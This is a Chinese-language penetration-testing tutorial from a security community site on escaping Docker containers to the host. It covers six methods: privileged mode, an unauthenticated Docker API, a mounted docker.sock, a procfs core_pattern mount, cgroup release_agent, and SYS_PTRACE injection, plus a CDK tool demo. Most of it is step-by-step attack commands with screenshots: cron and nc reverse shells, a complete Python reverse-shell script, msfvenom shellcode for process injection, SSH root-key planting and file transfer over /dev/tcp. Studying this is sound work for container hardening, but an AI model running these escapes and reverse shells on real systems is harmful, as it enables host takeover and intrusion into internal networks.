# docker逃逸方式总结分享-先知社区

> **来源**: https://xz.aliyun.com/news/17111  
> **文章ID**: 17111

---

## 前言

在实际渗透时，当拿到了一个shell，但是却发现所处的环境在docker容器里面，对后续的渗透不太方便，会遇到很多问题，比如说环境的缺失、常用命令无法执行、网段不通等

此时就需要进一步渗透，逃逸到宿主机中，拿到宿主机的权限，以便于更好的搜集内网信息，进行内网渗透。

**本文主要讲述：**  
一、docker环境判断  
二、docker逃逸方式

1. 特权模式
2. api 未授权
3. socket 挂载
4. procfs 挂载
5. cgroup 配置错误
6. SYS\_PTRACE 进程注入

三、CDK 利用工具演示

## Docker环境的判断

### 查看根目录下文件

Docker 容器内部默认会有一个名为 `.dockerenv` 的隐藏文件，位于根目录下（`/`）。

> ls / -al

​

![image.png](images/e3ab533e-b68a-3abb-be21-8a2649acdc6f)

检查  /proc/1/cgroup 文件

在 Linux 系统（包括 Docker 容器基于的 Linux 内核环境）中，`/proc` 是一个虚拟文件系统，其中的文件包含了有关进程的各种信息。对于容器内的进程，`/proc/1/cgroup` 文件内容会体现出与容器相关的一些特征。

如果包含 明显的 docker 标识 则表明处于 Docker 容器中。

> cat /proc/1/cgroup

宿主机环境  
![Pasted image 20250113134953.png](images/c94d2c95-3c4c-36ef-8db7-f3cbd5d4cdfa)

docker环境  
![IMG-20250109155312099.png](images/0c13a6a5-b46b-3af4-a4bf-3dd29c713035)

### 查看系统环境变量

当启动 Docker 容器时，Docker 会自动设置一些环境变量在容器内部，通过检查这些特定的环境变量是否存在，也可以作为辅助判断环境情况的一种手段。

比如说查看 hostname 的值，一般 Docker 容器的主机名会带有容器相关的标识，如下，很明显的docker id

![IMG-20250109160012144.png](images/e5ccadba-628b-3428-864c-72c76ba99161)  
不过这种判断方法不是绝对准确的，只是一种参考方式

## Docker逃逸方式

### 特权模式

特权模式逃逸是最简单有效的逃逸方法之一，当使用以特权模式（privileged参数）启动的容器时，就可以在docker容器内部 通过 mount 命令挂载外部主机磁盘设备，获得宿主机文件的读写权限。

**环境搭建**  
测试环境为 ubuntu 系统，版本为 18.04   
![IMG-20250111173751141.png](images/445ababe-5568-37af-8a0c-1a6be7a1733d)

查看当前环境是否为特权模式启动的

> cat /proc/self/status | grep CapEff

如下图，如果CapEff的值为：0000003fffffffff，则证明为特权模式启动  
![IMG-20250110093429191.png](images/7686302d-57ed-3fc7-a250-75093809a467)

`fdisk -l` 命令用于列出系统中所有磁盘设备的分区信息

> fdisk -l

![IMG-20250109170141919.png](images/3eece54f-b33d-3978-b419-f7630b188cb7)

创建一个目录 test11 ，并将磁盘设备 `/dev/vda1` 上的文件系统挂载到  `/test11` 目录下

> mkdir -p /test11  
> mount /dev/vda1 /test11

![IMG-20250109170742602.png](images/13ae9b76-e818-349e-b778-fe9f5093f7ce)

执行完毕之后查看 test11 目录，发现真实主机的系统文件，挂载入成功  
![IMG-20250109171020755.png](images/a539055c-d96d-3c53-b76f-1b122d9f357a)

挂载成功之后有 两种方式进行逃逸

1. 添加定时任务反弹shell
2. 设置ssh公钥

#### 定时任务反弹shell

在 /var/spool/cron 目录下新建一个 root 用户的定时任务  
（如果/var/spool/cron/目录下存在crontabs目录，则在/var/spool/cron/crontabs目录下进行新建）

> echo '\* \* \* \* \* bash -i >& /dev/tcp/ip/7777 0>&1' >> /test11/var/spool/cron/root

![IMG-20250110092938636.png](images/8cd326eb-5ce7-3e1f-b5aa-db4ae9df35d2)  
宿主机执行 crontab -l 命令查看定时任务，发现已经生效  
![IMG-20250110094238290.png](images/cabcf57e-134c-3390-a014-1d3ac94288c8)  
攻击机开启监听，获取到宿主机的 shell，逃逸成功  
![IMG-20250110093034213.png](images/37e8245d-c7b5-3dac-b21f-b5cb0353aada)

**避坑点**  
刚开始进行添加定时任务的时候，我直接在挂载的目录下找到宿主机的 crontab 文件，进行了修改，在这个文件里面写入了定时任务，去进行反弹。  
![IMG-20250109172428264.png](images/7a12c00c-d484-3074-bafc-ee5ac1a1ab7a)  
在宿主机中查看，crontab文件内容已经对应改变，证明修改成功  
![IMG-20250111173751278.png](images/5928ffd4-a83f-3e49-8c6b-0149fb7a4ec4)  
最后成功弹过来shell，但是发现弹过来的shell仍然是docker容器的权限  
![IMG-20250111173751380.png](images/05549189-2b5a-351f-a12b-76729df6522e)  
在宿主机执行 crontab -l ，列表为空  
![IMG-20250111173751489.png](images/117e3822-9aa9-32f9-af4a-1ea9fa3adef9)  
后来发现，直接编辑 `/etc/crontab` 并不一定会被宿主机识别为当前有效的定时任务。  
`crontab -l` 查看的是当前用户的任务，而在 Docker 容器中修改的`/etc/crontab` 可能是系统级任务  
如果需要针对具体用户添加任务，需要在 /var/spool/cron 目录下新建用户名文件去添加某个用户的定时任务

还要注意不同的 Linux 发行版 定时任务存储路径也是不同的，主要有两个路径：  
 `/var/spool/cron` **路径**

* **涉及系统**：Debian、Ubuntu、CentOS、RedHat 等主流 Linux 发行版。

`/etc/crontabs` **路径**

* **典型系统**：Alpine Linux 等轻量级发行版。

如果需要判断具体的宿主机系统版本，可以在 docker 容器中挂载了宿主机 文件后 通过如下命令进行查看

> cat /etc/os-release

这里的宿主机为 centos7 ，所以应该将定时任务写在 `/var/spool/cron` 目录下  
![IMG-20250110143838036.png](images/468dae7c-fbf1-3c99-a099-82337a9aa35e)

#### 写入ssh公钥

生成公私钥文件

> ssh-keygen -t rsa -b 4096 -f my\_key -N ""

![IMG-20250111173751594.png](images/b852a819-d65d-3b6a-bf34-5fefd0c89258)  
因为此时已经挂载了宿主机的目录，可以直接将公钥文件内容写入到宿主机的 `/root/.ssh/authorized_keys` 文件中，并赋予对应权限

> echo "公钥内容" >> /test11/root/.ssh/authorized\_keys  
> chmod 600 /test11/root/.ssh/authorized\_keys

![IMG-20250111173751705.png](images/b61e7ba4-86f5-308f-9da6-ad50fa375a97)  
修改宿主机的 `/etc/ssh/sshd_config` 文件设置一下参数

> PubkeyAuthentication yes  
> PermitRootLogin yesAuthorizedKeysFile .ssh/authorized\_keys

![IMG-20250111173751821.png](images/7ffcdf9e-7050-31b4-a5d6-286d92bad446)  
设置好之后 即可通过私钥进行连接，获取宿主机 root 权限，逃逸成功。

> ssh -i 私钥文件 root@ip

![IMG-20250111173751935.png](images/afb4e975-7931-35f6-b4d4-7eed90d8d5cb)

### Docker api 未授权

Docker Remote API是一个取代远程命令行界面(RCLI)的REST API，当该接口直接暴漏在外网环境中且未作权限检查时，可以直接通过恶意调用相关的API进行远程命令执行 实现逃逸。

**环境搭建**  
环境为 vulhub靶场中的 docker unauthorized-rce 镜像  
![IMG-20250110114333445.png](images/f05362cd-053e-3af9-8ada-079bec288605)

可以通过访问 ip:port 形式去查看是否存在漏洞，port一般为2375  
返回{"message":"page not found"}代表存在漏洞  
![IMG-20250110113605293.png](images/97f1bbea-f519-3cac-a31e-958a088f47b2)

使用 /version、/info 接口可以查看其他信息  
![IMG-20250110113856446.png](images/6e05fb1a-dbf2-3c26-b3ca-68edf92ab1bd)  
![IMG-20250110113927988.png](images/679efa45-568a-3f8f-ab5b-4596095151b1)  
进入靶机查看ip  
此时宿主机的 ip 为：172.22.0.2  
![IMG-20250110114553119.png](images/e8870d9d-fc4c-3d01-967f-526080541683)

在确定存在漏洞的情况下使用攻击机进行利用，可以通过docker命令对目标靶机进行一些docker 命令操作

查看目标上面启动的docker镜像

> docker -H tcp://ip:2375 ps

![IMG-20250110114821546.png](images/591cc1bf-0e76-394b-94dd-af87cacc2459)

创建一个 alpine:latest 镜像（轻量级），并在启动时设置参数，将宿主机的目录挂载到 镜像中的 /tmp 目录中

> docker -H tcp://ip:2375 run -id -v /:/tmp alpine:latest

查看容器 id，进入容器内

> docker -H tcp://ip:2375 ps  
> docker -H tcp://ip:2375 exec -it 8f9b946b36ec sh

进入 /tmp目录，发现磁盘已经挂载成功  
![IMG-20250110144116980.png](images/83021052-eb58-3818-8668-401089187184)  
docker环境的 ip为 172.17.0.3  
![IMG-20250110144143167.png](images/6f36acf1-0ac4-3c00-85a8-c339a89b7e1c)

此时获取宿主机权限的方式有两种，定时任务反弹shell和写入ssh公钥

#### 定时任务反弹shell

首先查看 宿主机 操作系统类型，从而确定 定时任务的写入路径

> cat /tmp/etc/os-release

![IMG-20250110144346806.png](images/1b877ff6-0591-3e14-b270-142683bcf588)  
宿主机系统为 Alpine Linux，则应该操作 `/etc/crontabs`，目录去进行写入定时任务  
此时的 root 文件没有定时任务  
![IMG-20250110145305757.png](images/adbd0289-8982-31de-afef-2b1553b208e4)

进入 `/etc/crontabs` 目录，往 root 文件里面写入反弹shell的命令

> echo '\* \* \* \* \* /usr/bin/nc ip 9999 -e /bin/sh' >> /tmp/etc/crontabs/root

![IMG-20250110145721484.png](images/bb24e850-43ad-3de2-a1f6-c766f34b58ea)  
在宿主机查看定时任务，已经生效  
![IMG-20250110145646974.png](images/c74c1364-c5d7-3a7c-9910-3d556cec3a48)  
攻击机开启监听，一分钟后，收到回连  
ip为：172.22.0.2，为宿主机的ip，逃逸成功  
![IMG-20250110160042649.png](images/e60758c8-a6d2-3d90-8c4e-5310de33ac9c)

#### 写入ssh公钥

也可以在 挂在后的宿主机 .ssh 目录下写入公钥，然后通过私钥连接进行逃逸  
![IMG-20250110162322209.png](images/4f58b306-403b-3128-8a1e-6da64c3807b5)  
因为这里宿主机环境是vulhub的docker靶场，仍然为docker环境，所以暂不演示，实际项目中宿主机为真实主机的情况下可以正常实现

### Docker Socket 逃逸

Docker Socket（也称为Docker API Socket）是Docker引擎的UNIX套接字文件，用于与Docker守护进程（Docker daemon）进行通信，实现执行各种操作，例如创建、运行和停止容器，构建和推送镜像，查看和管理容器的日志等。

也就是说如果这个文件被挂载了之后，就可以直接操作宿主机的docker服务，进行创建、修改、删除镜像，从而实现逃逸

**环境模拟**  
ubuntu 18.04  
启动镜像并挂载 /var/run/docker.sock

> docker run -itd -v /var/run/docker.sock:/var/run/docker.sock --name my\_ubuntu ubuntu:18.04

![IMG-20250111102009427.png](images/9667ec36-06eb-36f1-aa83-4a6a0eee3d6f)

首先判断当前容器是否挂载了 Docker Socket，如下图，docker.sock 文件存在 则证明被挂载

> ls -lah /var/run/docker.sock

![IMG-20250111102205508.png](images/dffb8bfc-7043-32ac-9b72-e9b70f51eef3)

准备逃逸

#### 新建容器挂载宿主机目录

前提条件：

1. 需要容器有docker环境（没有的话可以手动进行安装docker）

当前的环境中没有docker，手动进行安装

```
apt-get update  
apt-get install curl  
curl -fsSL https://get.docker.com/ | sh
```

![IMG-20250111102902861.png](images/d079af73-7a2c-3aa6-b94a-5230e2f892f6)

然后在容器内再创建启动一个容器，并在启动时挂载宿主机根目录

> docker run -it -v /:/tmp ubuntu /bin/bash

命令执行完毕之后，docker的容器 id 发生变化，证明已经直接进入了刚创建的新的容器里面  
查看 /tmp 目录，宿主机根目录已经成功挂载  
![IMG-20250111103852739.png](images/00929ccb-44be-3997-a46d-d71fbf263701)  
因为是直接操作的宿主机的 docker 服务，所以在宿主机进行查看，会发现多了个 docker 镜像，正是docker 容器里面创建的那个。  
![IMG-20250111110538588.png](images/f35962a0-45a9-3875-8947-9aae445600fc)  
在新创建的容器里面 使用 chroot 命令 更改当前进程的根目录 为挂载宿主机文件的 /tmp 目录  
![IMG-20250111110927193.png](images/ba7e96cc-e230-3312-b24d-ae2eca55b2ed)

#### 定时任务反弹shell

查看宿主机系统版本

> cat /etc/os-release

版本为 centos  
![IMG-20250111111200235.png](images/9a41a5d0-ccaf-39d3-b104-91d5063eb1f6)  
在 `/var/spool/cron` 目录下写入定时任务进行反弹shell

> echo '\* \* \* \* \* bash -i >& /dev/tcp/ip/7777 0>&1' >> /var/spool/cron/root

![IMG-20250111111708477.png](images/4c0717b3-096a-3b48-9e25-465bf3964fb8)  
宿主机查看定时任务，已经设置成功  
![IMG-20250111111736016.png](images/120f9397-c963-33e6-b401-d82be1c8e0b3)  
攻击机开启监听，成功获取宿主机 shell，逃逸成功  
![IMG-20250111112254647.png](images/302a1378-d1b1-3328-826a-4ca5301e2173)

#### 写入ssh公钥

> echo "公钥内容" >> /test11/root/.ssh/authorized\_keyschmod 600 /test11/root/.ssh/authorized\_keys  
> ![IMG-20250111112557782.png](images/cfb9658e-68c2-3a80-ab6c-34ca02401051)

```
PubkeyAuthentication yes  
PermitRootLogin yes 
AuthorizedKeysFile .ssh/authorized_keys
```

![IMG-20250111112653542.png](images/9eff646e-4bbb-33a6-b45d-14fbc974c8ce)  
通过私钥进行连接，获取宿主机root权限，逃逸成功  
![IMG-20250111112805024.png](images/54d7749b-4bd6-3818-b264-537c2a16a9db)

### Procfs危险挂载

linux中的`/proc`目录是一个伪文件系统，其中动态反应着系统内进程以及其他组件的状态。  
如果 docker 启动时将 /proc 目录挂载到了容器内部，就可以实现逃逸。

前置知识：  
`/proc/sys/kernel/core_pattern`文件是负责 进程崩溃时 的内存数据转储，当第一个字符是管道符`|`时，后面的部分会以命令行的方式进行解析并运行。并且由于容器共享主机内核的原因，这个命令是以宿主机的权限运行的。  
利用该解析方式，可以进行容器逃逸。

**环境搭建**  
启动一个 ubuntu 18.04 镜像，启动时将宿主机的 `/proc/sys/kernel/core_pattern`文件挂载到容器`/test2/` 目录下

> docker run -d --name ubuntu\_test -v /proc/sys/kernel/core\_pattern:/test2/proc/sys/kernel/core\_pattern ubuntu:18.04 tail -f /dev/null

![IMG-20250111140054000.png](images/632dab58-0dbc-3bf9-b57a-cfe610291623)

判断 是否挂载了宿主机的 procfs，执行下面的命令，如果找到两个 `core_pattern` 文件那可能就是挂载了宿主机的 procfs

> find / -name core\_pattern

第一个是容器本身的 procfs，第二个是挂载的宿主机的 procfs  
![IMG-20250111140342977.png](images/a1e7dae5-b7dc-3d61-9a5c-e758962d6a3c)  
找到当前容器在宿主机下的绝对路径

> cat /proc/mounts | xargs -d ',' -n 1 | grep workdir

**workdir** 是分层存储的工作目录，而**merged** 是挂载点（即容器的文件系统视图）  
将路径中的 `work` 替换为 `merged` 就是当前容器在宿主机上面的绝对路径  
由下图可知 当前容器在宿主机上面的绝对路径 为：`/var/lib/docker/overlay2/a7a150eaaad31da1134fda2cb314fb3268e3e47aac8f9775c6c42743c0653ffa/merged`  
![IMG-20250111141407836.png](images/334746ed-3e77-3832-a8c4-4cebf8ab666b)

宿主机访问该路径，发现在容器内创建的 test2 目录，路径正确  
![IMG-20250111141822827.png](images/6cd56e2d-2dda-3291-ab6b-51dda249f167)  
在 /tmp 目录下创建一个 exp.py 文件，此文件的功能是为了反弹shell  
 lhost 和 lport 分别是 要接收shell的 vps ip、端口

```
cat >/tmp/exp.py << EOF
#!/usr/bin/python
import os
import pty
import socket
lhost = "your_vps_ip"
lport = 8888
def main():
   s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
   s.connect((lhost, lport))
   os.dup2(s.fileno(), 0)
   os.dup2(s.fileno(), 1)
   os.dup2(s.fileno(), 2)
   os.putenv("HISTFILE", '/dev/null')
   pty.spawn("/bin/bash")
   os.remove('/tmp/.x.py')
   s.close()
if __name__ == "__main__":
   main()
EOF
```

![IMG-20250111151252213.png](images/b9402afc-dfa1-3031-97e9-5fbbdf20ed00)  
前面已经知道当前容器在宿主机内的绝对路径，故而可知当前文件在宿主机内的绝对路径为`/var/lib/docker/overlay2/a7a150eaaad31da1134fda2cb314fb3268e3e47aac8f9775c6c42743c0653ffa/merged/tmp/exp.py`  
将此路径写入到 宿主机的 `/proc/sys/kernel/core_pattern` 文件中

> echo -e "|/var/lib/docker/overlay2/a7a150eaaad31da1134fda2cb314fb3268e3e47aac8f9775c6c42743c0653ffa/merged/tmp/exp.py
> core " > /test2/proc/sys/kernel/core\_pattern

这里是利用 `/proc/sys/kernel/core_pattern` 在系统崩溃时会自动运行，给他指定运行的脚本路径为创建的恶意脚本文件路径，通过这种方式，一旦程序发生崩溃，就会自动运行该脚本，进行反弹宿主机 shell，实现逃逸。  
![IMG-20250111144118873.png](images/0bde3209-1381-3745-96c9-30c5d20b5370)

接下来就是想办法去让 docker崩溃，诱导系统加载 `core_pattern` 文件

创建一个恶意文件

```
cat >/tmp/exp.c << EOF
#include <stdio.h>
int main(void)
{
    int *a = NULL;
    *a = 1;
    return 0;
}
EOF
```

![IMG-20250111150303008.png](images/a1b19e9b-0cb1-3ba6-9d92-2b374dc453d4)  
使用 gcc 进行编译，需要使用到gcc环境，如果机器上面没有 gcc环境可以找个同核的机器编译好上传上去。  
这里我直接在靶场环境中 安装了 gcc

> apt-get update -y && apt-get install vim gcc -y

![IMG-20250111150103943.png](images/69f33d69-df08-38a6-9ae6-1b1529f5cd78)

![IMG-20250111150437690.png](images/8fc673c9-dbc4-3dfd-8ebc-9ab2a6022412)  
编译完成之后 攻击机 vps 开启监听，docker中运行 恶意程序使 docker 崩溃

![IMG-20250111150641143.png](images/3311490c-9841-3301-9eaa-49352c11616e)

获取宿主机 shell，逃逸成功  
![IMG-20250111150627405.png](images/e4326ede-76de-365c-acfb-3d5872bfb4a4)

### Cgroup 配置错误

Cgroup 是 Linux 提供的一种用于资源管理的功能，通过 Cgroup 可以对进程资源（如 CPU、内存等）的使用情况进行限制和统计。  
这种攻击利用了`notify_on_release` 和 `release_agent` 这两个 Cgroup 的机制，用于在 Cgroup 子目录资源被清空时执行特定的动作 实现逃逸

利用条件

* 以root用户身份在容器内运行
* 使用SYS\_ADMINLinux功能运行
* 缺少AppArmor配置文件，否则将允许mountsyscall
* cgroup v1虚拟文件系统必须以读写的方式安装在容器内

**环境模拟**  
拉取一个 ubuntu 18.04 的镜像

> docker run -itd --rm --cap-add=SYS\_ADMIN --security-opt apparmor=unconfined ubuntu:18.04

`--cap-add=SYS_ADMIN`: 使用SYS\_ADMINLinux功能运行  
`--security-opt apparmor=unconfined`: 禁用 **AppArmor** 安全模块的限制

![IMG-20250111162336108.png](images/516b6271-3b8b-35c6-8005-b3cbd26ee0c3)

在docker容器中 执行命令判断当前主机是否符合逃逸的利用条件  
确保具备 `SYS_ADMIN` 权限

> cat /proc/self/status | grep CapEff

![IMG-20250111163002321.png](images/173594a2-729f-3eee-be25-1120012b650e)

判断容器内挂载了 Cgroup 文件系统，且为读写模式。

```
mount | grep cgroup
ls -l /sys/fs/cgroup
```

![IMG-20250111163451828.png](images/7fefd011-44cf-3649-ad14-f4db9c9a71fd)

都满足条件之后进行利用  
创建一个临时目录用于挂载 Cgroup 文件系统

> mkdir /tmp/test3

挂载 Cgroup 文件系统到临时目录中

> mount -t cgroup -o memory cgroup /tmp/test3

`-t` 用于指定文件系统类型。`cgroup` 表示要挂载的是一个 Cgroup 文件系统  
 `-o` 用来指定挂载选项。 `memory` 表明挂载的是与内存（Memory）相关的 Cgroup 子系统  
 `cgroup`: 指定要挂载的 Cgroup 文件系统的名称或设备  
![IMG-20250111165002905.png](images/70c1478c-c14f-30fd-a8a7-73b9046e2e8b)

在挂载点下创建一个名为 "conf" 的子目录，用于设置特定 Cgroup 的配置

> mkdir /tmp/test3/conf

启用通知机制，当 `conf` 子目录的任务（进程）清空时会触发内核动作

> echo 1 > /tmp/test3/conf/notify\_on\_release

![IMG-20250111170018556.png](images/457dbc35-4056-3085-97fa-ec07735c9b98)  
使用 sed 命令从 /etc/mtab 文件中解析出宿主机的路径前缀

```
host_path=sed -n 's/.*\perdir=[^,]*.*/\1/p' /etc/mtab
```

`/etc/mtab` 记录了当前系统挂载的所有文件系统的信息，可以了解当前哪些设备或网络资源已经被挂载到文件系统中。  
通过获取宿主机的挂载路径，就可以在容器内部使用这个路径来操作宿主机上的文件  
这个路径会被用于配置 `release_agent`  
![IMG-20250111170026933.png](images/015ed360-a4bf-36dc-8934-03aacc3bf4ff)

设置 release\_agent 为一个脚本的路径，通知事件触发时由内核执行该脚本

> echo "$host\_path/cmd" > /tmp/test3/release\_agent

创建反弹 shell 的脚本，并写入其内容

> echo '#!/bin/sh' > /cmd   
> echo "bash -i >& /dev/tcp/ip/8888 0>&1" >> /cmd

![IMG-20250111170344210.png](images/3f345edf-39e8-3b2e-ba68-4ece5291915d)

将当前 shell 的 PID 写入 /tmp/test3/conf/cgroup.procs 文件 ，意味着当前 shell 进程将被“添加”到这个 cgroup 中，其他的进程被清空只保留当前的shell进程。  
 触发 notify\_on\_release，清空任务后，release\_agent 自动执行

> sh -c "echo  > /tmp/test3/conf/cgroup.procs"

`$$` 是一个特殊变量，它代表当前 shell 进程的 PID（进程 ID）

![IMG-20250111170701945.png](images/03221b3c-f680-3e1f-be8c-9d6065ee975c)

攻击机 vps 监听对应端口，获得宿主机 shell，成功逃逸  
![IMG-20250111170618680.png](images/08de2eee-8fdd-3891-a3aa-c55e1c327f8c)

### SYS\_PTRACE 进程注入

用户授予了容器SYS\_PTRACE权限，并且与宿主机共享一个进程命名空间(--pid=host)，使得在容器内可以查看到宿主机的进程，并可以利用进程注入，反弹shell，从而实现逃逸

利用条件

1. 容器有SYS\_PTRACE权限
2. 与宿主机共享一个进程命名空间
3. 容器以root权限运行

**环境搭建**  
拉取 ubuntu 18.04 版本镜像

> docker run -itd --pid=host --cap-add=SYS\_PTRACE ubuntu:18.04

![IMG-20250111200147094.png](images/e4758466-e068-391c-b5ea-6a93c4fbe1fd)

判断容器是否有 `SYS_PTRACE` 权限

* 如果输出中包含 `cap_sys_ptrace` 字段，说明容器具有该权限。
* 如果没有 `cap_sys_ptrace`，说明容器缺少此能力。

> capsh --print | grep cap\_sys\_ptrace

![IMG-20250111200543626.png](images/866f3abb-b3b3-3341-b6bb-18ef946be156)  
判断是否与宿主机共享进程命名空间  
如果能看到宿主机的进程（如 Docker 守护进程 `dockerd`），说明共享了宿主机的进程命名空间。

> ps aux | grep dockerd

![IMG-20250111200412809.png](images/5f863f35-8fcb-3e48-8bea-3cea794bf569)

符合条件之后 进行利用

下载进程注入的 c 文件  
<https://github.com/0x00pf/0x00sec_code/blob/master/mem_inject/infect.c>

使用 msf 生成反弹shell的 shellcode

> msfvenom -p linux/x64/shell\_reverse\_tcp LHOST=ip LPORT=6667 -f c

![IMG-20250113114808654.png](images/2c1d1226-af2a-3af8-971d-1c68502dfda4)

进程注入的 c 文件 中也有一段 shellcode 内容，使用 msf 生成的 shellcode 进行替换  
并修改 对应的 SHELLCODE\_SIZE 内容，为shellcode长度（ 一个 `\x02` 字符 为一个长度 ）

![IMG-20250111201008165.png](images/3433f008-7814-31b9-a55f-535e1db0c980)

然后上传到 docker 容器中进行编译

> gcc inject.c -o inject

![IMG-20250111201333137.png](images/d8b8bda9-50b3-3877-9d04-47ce8e7ee1c5)

查看 进程信息，找个 root 用户的进程进行注入

> ps -ef  
> ./inject <pid的值>

![IMG-20250111201457704.png](images/a07fee60-dc1c-3f06-b240-8757c56b35e0)

命令执行过后，返回内容如下图即注入成功

![IMG-20250111201436317.png](images/d80f3326-b738-35b3-901c-a4a00e5821ae)

msf 开启监听   
对应上 生成 shellcode 时的 payload、端口  
待进程注入成功之后，获得宿主机 shell，逃逸成功  
![IMG-20250111201708157.png](images/52f6a2fb-7642-398e-bc3a-ead85815ef1a)

## CDK 利用工具演示

CDK是一款为容器环境定制的渗透测试工具，在已攻陷的容器内部提供零依赖的常用命令及PoC/EXP。集成Docker/K8s场景特有的 逃逸、横向移动、持久化利用方式，插件化管理。

包括三个功能模块

1. Evaluate: 容器内部信息收集，以发现潜在的弱点便于后续利用。
2. Exploit: 提供容器逃逸、持久化、横向移动等利用方式。
3. Tool: 修复渗透过程中常用的linux命令以及与Docker/K8s API交互的命令。

下载地址：<https://github.com/cdk-team/CDK/>

需要先将工具直接传到 拿下的 docker 容器里。  
如果不能上传，可以执行下面的命令进行获取  
将 ckd 下载到攻击机 vps 上面，在上面执行命令

> nc -lvp 999 < cdk

![IMG-20250113094229719.png](images/b85511b8-5f35-3fde-a21b-f1e9def19545)

然后在拿下的 docker 容器里面执行命令进行获取

> cat < /dev/tcp/攻击机\_vps\_ip/999 > cdk

![IMG-20250113094428392.png](images/6f1f1447-1c1c-3ccd-bd20-16f12daed277)

执行命令进行信息收集，会自动搜集容器相关的信息，和可以利用的漏洞

> ./cdk evaluate

`System Info` --> 系统信息  
如下图，会收集当前 所在目录、当前用户、主机名、系统版本信息  
![IMG-20250113095214027.png](images/aa3093cc-7157-3791-b002-8d49871bac7e)

`Mounts` --> 目录的挂载情况  
![IMG-20250113095550828.png](images/11e97c65-a17f-3839-a93f-248ad19a740e)

`Commands and Capabilities` --> 能够执行的命令和能够进行利用的模块  
如下图，发现此环境中能够执行的系统命令有: wget,nc,docker,find,ps,vi,mount,fdisk,base64  
发现了两个可以进行利用的模块

![IMG-20250113095855635.png](images/53781746-a5e4-3a7d-8d87-fa4fe818d87e)

使用特权模式的利用模块进行逃逸

```
./cdk run mount-disk
```

执行命令会自动进行磁盘挂载，如下，将宿主机文件 挂载到了 当前docker容器的 /tmp/cdk\_LsTQy 目录下  
![IMG-20250113100810581.png](images/c0bb316b-772a-398d-aa6b-d05ec53db6e3)

进入目录查看，挂载成功  
![IMG-20250113101318348.png](images/bab0cc9d-cdd8-336b-bad9-c0c6fd9a5628)

然后可通过 定时任务反弹shell或者写入公钥的形式进行获取  
设置定时任务反弹shell  
![IMG-20250113102117181.png](images/9193ca70-fc28-3bdb-b5cb-0a22e5e450c9)

逃逸成功  
![IMG-20250113102149089.png](images/ebfdbbe7-b27b-3918-aeed-8de4617f54d4)
